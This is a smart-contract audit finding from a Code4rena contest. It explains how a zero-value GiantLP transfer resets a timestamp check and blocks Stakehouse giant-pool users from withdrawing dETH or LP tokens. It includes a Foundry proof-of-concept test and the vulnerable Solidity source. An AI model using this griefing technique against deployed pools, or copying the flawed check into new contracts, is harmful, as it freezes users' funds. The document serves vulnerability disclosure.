{
  "Title": "[M-01] Freezing of funds - Hacker can prevent users withdraws in giant pools",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L66\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L96\n\n\n# Vulnerability details\n\n## Impact\n\nA hacker can prevent users from withdrawing dETH or LPTokens in giant pools.\n\nThis bug causes a revert in:\n1. `WithdrawLP` - `GiantMevAndFeesPool`\n2. `WithdrawLP` - `GiantSavETHVaultPool`\n3. `WithdrawDETH` - `GiantSavETHVaultPool`\n\nA hacker can prevent a user from receiving dETH when users are eligible and guaranteed to receive it through their stake.\n\nThis causes a liquidity crunch as the only funds that are possible to withdraw are ETH. There is not enough ETH in the giant pools to facilitate a large withdraw as ETH is staked for LPTokens and dETH.\n\nThe giant pools will become insolvent to returning ETH, dETH or vault LPTokens.\n\n## Proof of Concept\n\nBoth `WithdrawLP` and `WithdrawDETH` act in a similar way:\n1. loop LPtokens received for withdraw\n2. Check user has enough Giant LP tokens to burn and pool has enough vault LP to give.\n3. Check that a day has passed since user has interacted with Giant LP Token\n4. burn tokens\n5. send tokens\n\nExample of `WithdrawDETH`:\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L66\n```\n    function withdrawDETH(\n        address[] calldata _savETHVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _savETHVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n\n        // Firstly capture current dETH balance and see how much has been deposited after the loop\n        uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));\n        for (uint256 i; i < numOfVaults; ++i) {\n            SavETHVault vault = SavETHVault(_savETHVaults[i]);\n\n            // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user\n            for (uint256 j; j < _lpTokens[i].length; ++j) {\n                LPToken token = _lpTokens[i][j];\n                uint256 amount = _amounts[i][j];\n\n                // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP\n                _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);\n\n                require(vault.isDETHReadyForWithdrawal(address(token)), \"dETH is not ready for withdrawal\");\n\n                // Giant LP is burned 1:1 with LPs from sub-networks\n                require(lpTokenETH.balanceOf(msg.sender) >= amount, \"User does not own enough LP\");\n\n                // Burn giant LP from user before sending them dETH\n                lpTokenETH.burn(msg.sender, amount);\n\n                emit LPBurnedForDETH(address(token), msg.sender, amount);\n            }\n\n            // Ask\n            vault.burnLPTokens(_lpTokens[i], _amounts[i]);\n        }\n\n        // Calculate how much dETH has been received from burning\n        dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;\n\n        // Send giant LP holder dETH owed\n        getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);\n    }\n```\n\nThe bug is in `_assertUserHasEnoughGiantLPToClaimVaultLP` in the last require that checks that a day has passed since the user has interacted with Giant LP Token:\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L93\n```\n    function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");\n        require(_token.balanceOf(address(this)) >= _amount, \"Pool does not own specified LP\");\n        require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, \"Too new\");\n    }\n```\n\nThe condition `lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp` can be set to fail by the hacker. The hacker  transfers 0 `lpTokenETH` tokens to  `msg.sender`. This transfer will update the `lastInteractedTimestamp` to now.\n\nThe above can be done once a day or on-demand by front-running the withdraw commands.\n\n`_afterTokenTransfer` in `GiantLP.sol`:\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L43\n```\n    function _afterTokenTransfer(address _from, address _to, uint256 _amount) internal override {\n        lastInteractedTimestamp[_from] = block.timestamp;\n        lastInteractedTimestamp[_to] = block.timestamp;\n        if (address(transferHookProcessor) != address(0)) ITransferHookProcessor(transferHookProcessor).afterTokenTransfer(_from, _to, _amount);\n    }\n```\n### Foundry POC\n\nThe POC will show how a hacker prevents a user from receiving dETH although they are eligible to receive it.\n\nAdd the following test to `GiantPools.t.sol`:\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/GiantPools.t.sol#L118\n```\n    function testPreventWithdraw() public {\n        // Set up users and ETH\n        address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);\n        address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);\n        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n\n        // Register BLS key\n        registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);\n\n        // Deposit 24 ETH into giant savETH\n        vm.prank(savETHUser);\n        giantSavETHPool.depositETH{value: 24 ether}(24 ether);\n        assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);\n        assertEq(address(giantSavETHPool).balance, 24 ether);\n\n        // Deploy 24 ETH from giant LP into savETH pool of LSDN instance\n        bytes[][] memory blsKeysForVaults = new bytes[][](1);\n        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);\n\n        uint256[][] memory stakeAmountsForVaults = new uint256[][](1);\n        stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);\n\n        giantSavETHPool.batchDepositETHForStaking(\n            getAddressArrayFromValues(address(manager.savETHVault())),\n            getUint256ArrayFromValues(24 ether),\n            blsKeysForVaults,\n            stakeAmountsForVaults\n        );\n        assertEq(address(manager.savETHVault()).balance, 24 ether);\n\n        // Deposit 4 ETH into giant fees and mev\n        vm.startPrank(feesAndMevUserOne);\n        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);\n        vm.stopPrank();\n\n        assertEq(address(giantFeesAndMevPool).balance, 4 ether);\n        stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);\n        giantFeesAndMevPool.batchDepositETHForStaking(\n            getAddressArrayFromValues(address(manager.stakingFundsVault())),\n            getUint256ArrayFromValues(4 ether),\n            blsKeysForVaults,\n            stakeAmountsForVaults\n        );\n\n        // Ensure we can stake and mint derivatives\n        stakeAndMintDerivativesSingleKey(blsPubKeyOne);\n\n        IERC20 dETHToken = savETHVault.dETHToken();\n\n        vm.startPrank(accountFive);\n        dETHToken.transfer(address(savETHVault.saveETHRegistry()), 24 ether);\n        vm.stopPrank();\n\n        LPToken[] memory tokens = new LPToken[](1);\n        tokens[0] = savETHVault.lpTokenForKnot(blsPubKeyOne);\n\n        LPToken[][] memory allTokens = new LPToken[][](1);\n        allTokens[0] = tokens;\n\n        stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);\n\n        // User will not have any dETH to start\n        assertEq(dETHToken.balanceOf(savETHUser), 0);\n\n        // Warp ahead -> savETHUser eligible to dETH\n        vm.warp(block.timestamp + 2 days);\n\n        // Send 0 tokens to savETHUser so he cannot withdrawDETH\n        address hacker = address(0xdeadbeef);\n        vm.startPrank(hacker);\n        giantSavETHPool.lpTokenETH().transfer(savETHUser, 0);\n        vm.stopPrank();\n        address[] memory addresses = getAddressArrayFromValues(address(manager.savETHVault()));\n\n        vm.startPrank(savETHUser);\n        // Validate withdrawDETH will revert  \n        vm.expectRevert(\"Too new\");\n        giantSavETHPool.withdrawDETH(addresses, allTokens, stakeAmountsForVaults);\n        vm.stopPrank();    \n    }\n```\n\nTo run the POC execute: \n`yarn test -m \"PreventWithdraw\" -v`\n\nExpected output: \n```\nRunning 1 test for test/foundry/GiantPools.t.sol:GiantPoolTests\n[PASS] testPreventWithdraw() (gas: 3132637)\nTest result: ok. 1 passed; 0 failed; finished in 9.25ms\n```\n\nTo run with full trace, execute: `yarn test -m \"PreventWithdraw\" -vvvv`\n\n## Tools Used\n\nVS Code, Foundry\n\n## Recommended Mitigation Steps\n\nMake sure transfers in the GiantLP are only for funds larger than (0.001 ETH), this will make the exploitation expensive.",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-11-lsd-network-stakehouse-contest",
  "Code": [
    {
      "filename": "contracts/liquid-staking/GiantPoolBase.sol",
      "content": "pragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { ReentrancyGuard } from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\n\ncontract GiantPoolBase is ReentrancyGuard {\n\n    /// @notice Emitted when an account deposits Ether into the giant pool\n    event ETHDeposited(address indexed sender, uint256 amount);\n\n    /// @notice Emitted when giant LP is burnt to recover ETH\n    event LPBurnedForETH(address indexed sender, uint256 amount);\n\n    /// @notice Emitted when giant LP is burnt to receive LP from a specific vault\n    event LPSwappedForVaultLP(address indexed vaultLPToken, address indexed sender, uint256 amount);\n\n    /// @notice Minimum amount of Ether that can be deposited into the contract\n    uint256 public constant MIN_STAKING_AMOUNT = 0.001 ether;\n\n    /// @notice Total amount of ETH sat idle ready for either withdrawal or depositing into a liquid staking network\n    uint256 public idleETH;\n\n    /// @notice LP token representing all ETH deposited and any ETH converted into savETH vault LP tokens from any liquid staking network\n    GiantLP public lpTokenETH;\n\n    /// @notice Address of the liquid staking derivative factory that provides a source of truth on individual networks that can be funded\n    LSDNFactory public liquidStakingDerivativeFactory;\n\n    /// @notice Add ETH to the ETH LP pool at a rate of 1:1. LPs can always pull out at same rate.\n    function depositETH(uint256 _amount) public payable {\n        require(msg.value >= MIN_STAKING_AMOUNT, \"Minimum not supplied\");\n        require(msg.value == _amount, \"Value equal to amount\");\n\n        // The ETH capital has not yet been deployed to a liquid staking network\n        idleETH += msg.value;\n\n        // Mint giant LP at ratio of 1:1\n        lpTokenETH.mint(msg.sender, msg.value);\n\n        // If anything extra needs to be done\n        _onDepositETH();\n\n        emit ETHDeposited(msg.sender, msg.value);\n    }\n\n    /// @notice Allow a user to chose to burn their LP tokens for ETH only if the requested amount is idle and available from the contract\n    /// @param _amount of LP tokens user is burning in exchange for same amount of ETH\n    function withdrawETH(uint256 _amount) external nonReentrant {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");\n        require(lpTokenETH.balanceOf(msg.sender) >= _amount, \"Invalid balance\");\n        require(idleETH >= _amount, \"Come back later or withdraw less ETH\");\n\n        idleETH -= _amount;\n\n        lpTokenETH.burn(msg.sender, _amount);\n        (bool success,) = msg.sender.call{value: _amount}(\"\");\n        require(success, \"Failed to transfer ETH\");\n\n        emit LPBurnedForETH(msg.sender, _amount);\n    }\n\n    /// @notice Allow a user to chose to withdraw vault LP tokens by burning their giant LP tokens. 1 Giant LP == 1 vault LP\n    /// @param _lpTokens List of LP tokens being owned and being withdrawn from the giant pool\n    /// @param _amounts List of amounts of giant LP being burnt in exchange for vault LP\n    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external {\n        uint256 amountOfTokens = _lpTokens.length;\n        require(amountOfTokens > 0, \"Empty arrays\");\n        require(amountOfTokens == _amounts.length, \"Inconsistent array lengths\");\n\n        _onWithdraw(_lpTokens);\n\n        for (uint256 i; i < amountOfTokens; ++i) {\n            LPToken token = _lpTokens[i];\n            uint256 amount = _amounts[i];\n\n            _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);\n\n            // Burn giant LP from user before sending them an LP token from this pool\n            lpTokenETH.burn(msg.sender, amount);\n\n            // Giant LP tokens in this pool are 1:1 exchangeable with external savETH vault LP\n            token.transfer(msg.sender, amount);\n\n            emit LPSwappedForVaultLP(address(token), msg.sender, amount);\n        }\n    }\n\n    /// @dev Check the msg.sender has enough giant LP to burn and that the pool has enough savETH vault LP\n    function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");\n        require(_token.balanceOf(address(this)) >= _amount, \"Pool does not own specified LP\");\n        require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, \"Too new\");\n    }\n\n    /// @dev Allow an inheriting contract to have a hook for performing operations post depositing ETH\n    function _onDepositETH() internal virtual {}\n\n    /// @dev Allow an inheriting contract to have a hook for performing operations during withdrawal of LP tokens when burning giant LP\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal virtual {}\n}"
    },
    {
      "filename": "contracts/liquid-staking/GiantSavETHVaultPool.sol",
      "content": "pragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { SavETHVault } from \"./SavETHVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\n\n/// @notice A giant pool that can provide protected deposit liquidity to any liquid staking network\ncontract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {\n\n    /// @notice Emitted when giant LP is burnt to receive dETH\n    event LPBurnedForDETH(address indexed savETHVaultLPToken, address indexed sender, uint256 amount);\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(0), \"GiantETHLP\", \"gETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Given the liquidity of the giant pool, stake ETH to receive protected deposits from many liquid staking networks (LSDNs)\n    /// @dev Take ETH from the contract balance in order to send money to the individual vaults\n    /// @param _savETHVaults List of savETH vaults that belong to individual liquid staking derivative networks\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeys For every savETH vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _stakeAmounts For every savETH vault, the amount of ETH each BLS key will receive in funding\n    function batchDepositETHForStaking(\n        address[] calldata _savETHVaults,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeys,\n        uint256[][] calldata _stakeAmounts\n    ) public {\n        uint256 numOfSavETHVaults = _savETHVaults.length;\n        require(numOfSavETHVaults > 0, \"Empty arrays\");\n        require(numOfSavETHVaults == _ETHTransactionAmounts.length, \"Inconsistent array lengths\");\n        require(numOfSavETHVaults == _blsPublicKeys.length, \"Inconsistent array lengths\");\n        require(numOfSavETHVaults == _stakeAmounts.length, \"Inconsistent array lengths\");\n\n        // For every vault specified, supply ETH for at least 1 BLS public key of a LSDN validator\n        for (uint256 i; i < numOfSavETHVaults; ++i) {\n            uint256 transactionAmount = _ETHTransactionAmounts[i];\n\n            // As ETH is being deployed to a savETH pool vault, it is no longer idle\n            idleETH -= transactionAmount;\n\n            SavETHVault savETHPool = SavETHVault(_savETHVaults[i]);\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            // Deposit ETH for staking of BLS key\n            savETHPool.batchDepositETHForStaking{ value: transactionAmount }(\n                _blsPublicKeys[i],\n                _stakeAmounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults\n    /// @param _savETHVaults List of savETH vaults being interacted with\n    /// @param _lpTokens List of savETH vault LP being burnt from the giant pool in exchange for dETH\n    /// @param _amounts Amounts of giant LP the user owns which is burnt 1:1 with savETH vault LP and in turn that will give a share of dETH\n    function withdrawDETH(\n        address[] calldata _savETHVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _savETHVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n\n        // Firstly capture current dETH balance and see how much has been deposited after the loop\n        uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));\n        for (uint256 i; i < numOfVaults; ++i) {\n            SavETHVault vault = SavETHVault(_savETHVaults[i]);\n\n            // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user\n            for (uint256 j; j < _lpTokens[i].length; ++j) {\n                LPToken token = _lpTokens[i][j];\n                uint256 amount = _amounts[i][j];\n\n                // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP\n                _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);\n\n                require(vault.isDETHReadyForWithdrawal(address(token)), \"dETH is not ready for withdrawal\");\n\n                // Giant LP is burned 1:1 with LPs from sub-networks\n                require(lpTokenETH.balanceOf(msg.sender) >= amount, \"User does not own enough LP\");\n\n                // Burn giant LP from user before sending them dETH\n                lpTokenETH.burn(msg.sender, amount);\n\n                emit LPBurnedForDETH(address(token), msg.sender, amount);\n            }\n\n            // Ask\n            vault.burnLPTokens(_lpTokens[i], _amounts[i]);\n        }\n\n        // Calculate how much dETH has been received from burning\n        dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;\n\n        // Send giant LP holder dETH owed\n        getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _savETHVaults List of savETH vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _savETHVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _savETHVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            SavETHVault(_savETHVaults[i]).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a savETH vault can be brought back into the giant pool\n    /// @param _savETHVaults List of savETH vaults where ETH is staked\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a savETH vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _savETHVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _savETHVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            SavETHVault vault = SavETHVault(_savETHVaults[i]);\n            for (uint256 j; j < _lpTokens[i].length; ++j) {\n                require(\n                    vault.isDETHReadyForWithdrawal(address(_lpTokens[i][j])) == false,\n                    \"ETH is either staked or derivatives minted\"\n                );\n            }\n\n            vault.burnLPTokens(_lpTokens[i], _amounts[i]);\n        }\n    }\n}"
    },
    {
      "filename": "contracts/liquid-staking/GiantPoolBase.sol",
      "content": "pragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { ReentrancyGuard } from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\n\ncontract GiantPoolBase is ReentrancyGuard {\n\n    /// @notice Emitted when an account deposits Ether into the giant pool\n    event ETHDeposited(address indexed sender, uint256 amount);\n\n    /// @notice Emitted when giant LP is burnt to recover ETH\n    event LPBurnedForETH(address indexed sender, uint256 amount);\n\n    /// @notice Emitted when giant LP is burnt to receive LP from a specific vault\n    event LPSwappedForVaultLP(address indexed vaultLPToken, address indexed sender, uint256 amount);\n\n    /// @notice Minimum amount of Ether that can be deposited into the contract\n    uint256 public constant MIN_STAKING_AMOUNT = 0.001 ether;\n\n    /// @notice Total amount of ETH sat idle ready for either withdrawal or depositing into a liquid staking network\n    uint256 public idleETH;\n\n    /// @notice LP token representing all ETH deposited and any ETH converted into savETH vault LP tokens from any liquid staking network\n    GiantLP public lpTokenETH;\n\n    /// @notice Address of the liquid staking derivative factory that provides a source of truth on individual networks that can be funded\n    LSDNFactory public liquidStakingDerivativeFactory;\n\n    /// @notice Add ETH to the ETH LP pool at a rate of 1:1. LPs can always pull out at same rate.\n    function depositETH(uint256 _amount) public payable {\n        require(msg.value >= MIN_STAKING_AMOUNT, \"Minimum not supplied\");\n        require(msg.value == _amount, \"Value equal to amount\");\n\n        // The ETH capital has not yet been deployed to a liquid staking network\n        idleETH += msg.value;\n\n        // Mint giant LP at ratio of 1:1\n        lpTokenETH.mint(msg.sender, msg.value);\n\n        // If anything extra needs to be done\n        _onDepositETH();\n\n        emit ETHDeposited(msg.sender, msg.value);\n    }\n\n    /// @notice Allow a user to chose to burn their LP tokens for ETH only if the requested amount is idle and available from the contract\n    /// @param _amount of LP tokens user is burning in exchange for same amount of ETH\n    function withdrawETH(uint256 _amount) external nonReentrant {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");\n        require(lpTokenETH.balanceOf(msg.sender) >= _amount, \"Invalid balance\");\n        require(idleETH >= _amount, \"Come back later or withdraw less ETH\");\n\n        idleETH -= _amount;\n\n        lpTokenETH.burn(msg.sender, _amount);\n        (bool success,) = msg.sender.call{value: _amount}(\"\");\n        require(success, \"Failed to transfer ETH\");\n\n        emit LPBurnedForETH(msg.sender, _amount);\n    }\n\n    /// @notice Allow a user to chose to withdraw vault LP tokens by burning their giant LP tokens. 1 Giant LP == 1 vault LP\n    /// @param _lpTokens List of LP tokens being owned and being withdrawn from the giant pool\n    /// @param _amounts List of amounts of giant LP being burnt in exchange for vault LP\n    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external {\n        uint256 amountOfTokens = _lpTokens.length;\n        require(amountOfTokens > 0, \"Empty arrays\");\n        require(amountOfTokens == _amounts.length, \"Inconsistent array lengths\");\n\n        _onWithdraw(_lpTokens);\n\n        for (uint256 i; i < amountOfTokens; ++i) {\n            LPToken token = _lpTokens[i];\n            uint256 amount = _amounts[i];\n\n            _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);\n\n            // Burn giant LP from user before sending them an LP token from this pool\n            lpTokenETH.burn(msg.sender, amount);\n\n            // Giant LP tokens in this pool are 1:1 exchangeable with external savETH vault LP\n            token.transfer(msg.sender, amount);\n\n            emit LPSwappedForVaultLP(address(token), msg.sender, amount);\n        }\n    }\n\n    /// @dev Check the msg.sender has enough giant LP to burn and that the pool has enough savETH vault LP\n    function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");\n        require(_token.balanceOf(address(this)) >= _amount, \"Pool does not own specified LP\");\n        require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, \"Too new\");\n    }\n\n    /// @dev Allow an inheriting contract to have a hook for performing operations post depositing ETH\n    function _onDepositETH() internal virtual {}\n\n    /// @dev Allow an inheriting contract to have a hook for performing operations during withdrawal of LP tokens when burning giant LP\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal virtual {}\n}"
    }
  ]
}